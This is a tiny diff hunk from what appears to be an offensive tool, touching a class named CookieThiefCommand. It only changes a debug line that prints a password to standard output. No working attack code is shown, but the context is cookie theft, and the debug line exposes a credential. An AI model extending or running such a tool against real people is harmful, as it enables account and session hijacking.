@@ -77,7 +77,7 @@ class CookieThiefCommand(CommandBase):
             sys.stdout.flush()
 
         ##DEBUG:
-        print("Password: " + str(password))
+        print("Password: " + password[0])
         sys.stdout.flush()
 
         try:
